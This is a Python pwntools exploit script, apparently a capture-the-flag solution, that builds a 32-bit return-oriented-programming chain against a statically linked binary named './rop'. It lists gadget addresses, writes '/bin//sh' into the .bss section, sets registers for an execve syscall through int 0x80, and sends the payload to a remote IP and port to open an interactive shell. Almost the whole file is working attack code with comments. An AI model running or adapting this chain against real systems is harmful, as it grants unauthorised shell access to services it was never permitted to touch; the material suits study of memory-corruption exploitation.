from pwn import *

# we need to write the params for execve
# there is no libc here! :D

# Gadgets

#0x080a8e36 : pop eax ; ret
#0x080481c9 : pop ebx ; ret
#0x08056334 : pop eax ; pop edx ; pop ebx ; ret
pop_eax = p32(0x080a8e36)
pop_ebx = p32(0x080481c9)
pop_eax_3 = p32(0x08056334) # watch out, this destroys edx and ebx

# as there are no pop ecx; gadgets alone, this gadgets pops edx, ecx, and ebx
#0x0806ee91 : pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx_ret = p32(0x0806ee91)
#0x0806ee6b : pop edx ; ret
pop_edx = p32(0x0806ee6b)

#0x080481b2 : ret
ret = p32(0x080481b2)

# set edx to zero are a combination of these two
#0x08056420 : xor eax, eax ; ret
#0x0806abac : xchg eax, edx ; ror byte ptr [edi], 0x94 ; ret
set_edx_to_zero_destroy_edi_content = p32(0x08056420) + p32(0x0806abac)

#write gadget
#0x08064794 : mov dword ptr [edx], eax ; mov eax, edx ; ret
write_eax_to_edx_ptr = p32(0x08064794)

#execute syscall
#0x0806f79f : nop ; int 0x80
int80 = p32(0x0806f7a0)
# writable section: .bss
""" Disassembly of section .tbss:
080d86f0 <__preinit_array_end>:
        ...
Disassembly of section .init_array:
--
Disassembly of section .bss:
080db320 <completed.6766>:
 80db320:       00 00                   add    %al,(%eax)
        ...
"""

BSS_ADDR = p32(0x080db320) 
BSS_ADDR_PLUS_4 = p32(0x080db320 + 4)
BSS_ADDR_PLUS_16 = p32(0x080db320 + 16)
BSS_ADDR_PLUS_16_PLUS_4 = p32(0x080db320 + 16 + 4)

expl = 'A'*28

# as ECX is an special case because pop-ing destroys some registers, we
# set up this first
expl += pop_edx_ecx_ebx_ret
expl += 'B'*4
expl += BSS_ADDR_PLUS_16 # here we save the ptr pointing to .bss
                         # in a few functions we set up this,
                         # but we need to set up first of all the ECX register

expl += 'C'*4

# we start to write /bin/sh to bss 
expl += pop_eax_3 # also ret, destroys ebx and edx
expl += "/bin" # dword
expl += 'X'*8 # balance

expl += pop_edx # edx should point to...
expl += BSS_ADDR # BSS_ADDR
expl += write_eax_to_edx_ptr

expl += pop_eax_3 # also ret
expl += "//sh" # dword, need 4 chars and execve ignores multiple /
expl += 'X'*8 # balance

expl += pop_edx # edx should point to...
expl += BSS_ADDR_PLUS_4 # BSS_ADDR + 4
expl += write_eax_to_edx_ptr

# we copied /bin//sh to .bss
# and now we need to create a ptr after this pointing
# to the start of the string

expl += pop_eax_3
expl += BSS_ADDR # the address where is the first element of the string "/bin//sh"
expl += 'X'*8 # balance

expl += pop_edx
expl += BSS_ADDR_PLUS_16 # save it here, far from the string
expl += write_eax_to_edx_ptr

# also in the next address we need to put a NULL
# to avoid this:
"""
fstat64(0, {st_mode=S_IFREG|0664, st_size=168, ...}) = 0
read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\221\356\6\10"..., 4096) = 168
read(0, "", 4096)                       = 0
execve("/bin//sh", ["/bin//sh", 0x7f8], NULL) = -1 EFAULT (Bad address)
getegid32()                             = 1000
"""

expl += pop_eax_3
expl += p32(0x0)
expl += 'X'*8 # balance

expl += pop_edx
expl += BSS_ADDR_PLUS_16_PLUS_4
expl += write_eax_to_edx_ptr

# we need to setup our registers for execvp

# first eax, becase it destroys registers
# EAX should be the number of the syscall, which is 0x0b
expl += pop_eax_3
expl += p32(0x0b)
expl += 'X'*8


# EDX should be zero
expl += pop_edx
expl += p32(0x0)

# EBX should be ptr to the location of string /bin//sh
expl += pop_ebx
expl += BSS_ADDR

# execute syscall

expl += int80

expl += p32(0x080488dd) # main


p= process('./rop')
p = remote("45.122.249.68",10007)
p.sendline(expl)
p.interactive()

